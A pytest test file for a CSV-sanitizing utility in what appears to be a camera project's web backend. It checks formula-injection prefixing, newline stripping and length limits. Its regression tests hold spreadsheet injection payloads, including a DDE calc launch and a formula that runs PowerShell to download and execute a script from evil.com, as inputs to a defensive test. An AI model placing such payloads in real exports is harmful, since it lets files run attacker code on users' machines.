"""
Unit tests for webui/backend/utils.py shared utility functions

Tests cover security-critical functions including CSV injection prevention,
file backup utilities, and path traversal protection.
"""

import pytest
import sys
from pathlib import Path

# Add the webui backend to the Python path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "webui" / "backend"))

from utils import sanitize_csv_value


class TestSanitizeCSVValue:
    """Test CSV injection prevention and sanitization"""

    # ========================================================================
    # Formula Injection Prevention Tests
    # ========================================================================

    def test_sanitize_formula_equals(self):
        """Should prefix formulas starting with = to prevent injection"""
        result = sanitize_csv_value("=SUM(A1:A10)")
        assert result == "'=SUM(A1:A10)"

    def test_sanitize_formula_plus(self):
        """Should prefix formulas starting with + to prevent injection"""
        result = sanitize_csv_value("+1234")
        assert result == "'+1234"

    def test_sanitize_formula_minus(self):
        """Should prefix formulas starting with - to prevent injection"""
        result = sanitize_csv_value("-1234")
        assert result == "'-1234"

    def test_sanitize_formula_at(self):
        """Should prefix formulas starting with @ to prevent injection"""
        result = sanitize_csv_value("@SUM(A1:A10)")
        assert result == "'@SUM(A1:A10)"

    def test_sanitize_formula_tab(self):
        """Should prefix values starting with tab to prevent injection"""
        result = sanitize_csv_value("\tmalicious")
        assert result == "'\tmalicious"

    def test_sanitize_formula_carriage_return(self):
        """Should prefix values starting with CR to prevent injection and remove CR"""
        result = sanitize_csv_value("\rmalicious")
        # CR is both prefixed AND replaced with space
        assert result == "' malicious"

    def test_sanitize_complex_formula(self):
        """Should handle complex Excel formulas"""
        result = sanitize_csv_value("=HYPERLINK(\"http://evil.com\",\"Click me\")")
        assert result == "'=HYPERLINK(\"http://evil.com\",\"Click me\")"

    # ========================================================================
    # Newline/Control Character Removal Tests
    # ========================================================================

    def test_sanitize_newline(self):
        """Should replace newlines with spaces"""
        result = sanitize_csv_value("Line 1\nLine 2")
        assert result == "Line 1 Line 2"
        assert '\n' not in result

    def test_sanitize_carriage_return_in_middle(self):
        """Should replace carriage returns with spaces"""
        result = sanitize_csv_value("Line 1\rLine 2")
        assert result == "Line 1 Line 2"
        assert '\r' not in result

    def test_sanitize_crlf(self):
        """Should replace Windows line endings (CRLF) with spaces"""
        result = sanitize_csv_value("Line 1\r\nLine 2")
        assert result == "Line 1  Line 2"
        assert '\r' not in result
        assert '\n' not in result

    def test_sanitize_multiple_newlines(self):
        """Should replace all newlines with spaces"""
        result = sanitize_csv_value("A\nB\nC\nD")
        assert result == "A B C D"

    # ========================================================================
    # Length Limiting Tests (DoS Prevention)
    # ========================================================================

    def test_sanitize_length_under_limit(self):
        """Should not modify strings under 1000 characters"""
        short_text = "A" * 999
        result = sanitize_csv_value(short_text)
        assert result == short_text
        assert len(result) == 999

    def test_sanitize_length_at_limit(self):
        """Should not modify strings exactly at 1000 characters"""
        exact_text = "A" * 1000
        result = sanitize_csv_value(exact_text)
        assert result == exact_text
        assert len(result) == 1000

    def test_sanitize_length_over_limit(self):
        """Should truncate strings over 1000 characters"""
        long_text = "A" * 2000
        result = sanitize_csv_value(long_text)
        assert len(result) == 1000
        assert result == "A" * 1000

    def test_sanitize_length_massive_string(self):
        """Should truncate very large strings to prevent DoS"""
        massive_text = "X" * 1000000
        result = sanitize_csv_value(massive_text)
        assert len(result) == 1000

    # ========================================================================
    # Type Handling Tests
    # ========================================================================

    def test_sanitize_string(self):
        """Should handle string input"""
        result = sanitize_csv_value("Normal text")
        assert result == "Normal text"

    def test_sanitize_integer(self):
        """Should convert integers to strings"""
        result = sanitize_csv_value(42)
        assert result == "42"

    def test_sanitize_float(self):
        """Should convert floats to strings"""
        result = sanitize_csv_value(3.14159)
        assert result == "3.14159"

    def test_sanitize_boolean_true(self):
        """Should convert True to string"""
        result = sanitize_csv_value(True)
        assert result == "True"

    def test_sanitize_boolean_false(self):
        """Should convert False to string"""
        result = sanitize_csv_value(False)
        assert result == "False"

    def test_sanitize_none(self):
        """Should convert None to string"""
        result = sanitize_csv_value(None)
        assert result == "None"

    def test_sanitize_negative_number(self):
        """Should handle negative numbers (prefix with quote since starts with -)"""
        result = sanitize_csv_value(-42)
        assert result == "'-42"

    # ========================================================================
    # Edge Cases and Special Characters
    # ========================================================================

    def test_sanitize_empty_string(self):
        """Should handle empty strings"""
        result = sanitize_csv_value("")
        assert result == ""

    def test_sanitize_whitespace_only(self):
        """Should preserve whitespace-only strings"""
        result = sanitize_csv_value("   ")
        assert result == "   "

    def test_sanitize_unicode(self):
        """Should handle Unicode characters"""
        result = sanitize_csv_value("Hello 世界 🌍")
        assert result == "Hello 世界 🌍"

    def test_sanitize_special_chars(self):
        """Should preserve safe special characters unless they start the string"""
        result = sanitize_csv_value("!@#$%^&*()")
        # String doesn't start with dangerous char, so no prefix
        assert result == "!@#$%^&*()"

        # But @ at the START is dangerous
        result2 = sanitize_csv_value("@#$%^&*()")
        assert result2 == "'@#$%^&*()"

    def test_sanitize_quotes(self):
        """Should preserve quotes in content"""
        result = sanitize_csv_value('She said "Hello"')
        assert result == 'She said "Hello"'

    def test_sanitize_commas(self):
        """Should preserve commas (CSV will handle escaping)"""
        result = sanitize_csv_value("Value1, Value2, Value3")
        assert result == "Value1, Value2, Value3"

    # ========================================================================
    # Combined Attack Vectors
    # ========================================================================

    def test_sanitize_formula_with_newlines(self):
        """Should handle formulas with newlines"""
        result = sanitize_csv_value("=SUM(\nA1:A10)")
        assert result == "'=SUM( A1:A10)"
        assert '\n' not in result

    def test_sanitize_long_formula(self):
        """Should handle long formulas (prefix then truncate after 1000 chars total)"""
        # The formula is 1201 chars: = (1) + A1+ (3) * 300 = 901, so total = 1 + 900 = 901
        # After prefixing with ' it becomes 902 chars, which is under 1000, so no truncation
        long_formula = "=" + "A1+" * 300  # = 1 + 900 = 901 chars
        result = sanitize_csv_value(long_formula)
        assert result.startswith("'=")
        # Actually this is 902 chars (901 original + 1 quote), under limit
        assert len(result) == 902

        # Test actual truncation with truly long string
        very_long = "=" + "X" * 2000  # 2001 chars
        result2 = sanitize_csv_value(very_long)
        assert len(result2) == 1000  # Truncated to 1000
        assert result2.startswith("'=")  # Still prefixed

    def test_sanitize_normal_minus_sign_in_middle(self):
        """Should NOT prefix values with minus sign in middle"""
        result = sanitize_csv_value("This is a - normal text")
        assert result == "This is a - normal text"
        assert not result.startswith("'")

    def test_sanitize_camera_setting_value(self):
        """Should handle typical camera setting values"""
        result = sanitize_csv_value("1280x720")
        assert result == "1280x720"

    def test_sanitize_filepath(self):
        """Should handle file paths"""
        result = sanitize_csv_value("/home/mothbox/photos/image.jpg")
        assert result == "/home/mothbox/photos/image.jpg"

    def test_sanitize_url(self):
        """Should handle URLs"""
        result = sanitize_csv_value("https://example.com/path?query=value")
        assert result == "https://example.com/path?query=value"

    # ========================================================================
    # Security Regression Tests
    # ========================================================================

    def test_sanitize_dde_injection(self):
        """Should prevent DDE (Dynamic Data Exchange) injection"""
        dde_payload = "@SUM(1+1)*cmd|'/c calc'!A1"
        result = sanitize_csv_value(dde_payload)
        assert result.startswith("'")

    def test_sanitize_cmd_injection_attempt(self):
        """Should prefix command injection attempts"""
        cmd_payload = "=cmd|'/c powershell IEX(wget evil.com/shell.ps1)'"
        result = sanitize_csv_value(cmd_payload)
        assert result.startswith("'=")

    def test_sanitize_hyperlink_injection(self):
        """Should prefix hyperlink formula injection"""
        hyperlink = '=HYPERLINK("http://evil.com","Click")'
        result = sanitize_csv_value(hyperlink)
        assert result.startswith("'=")
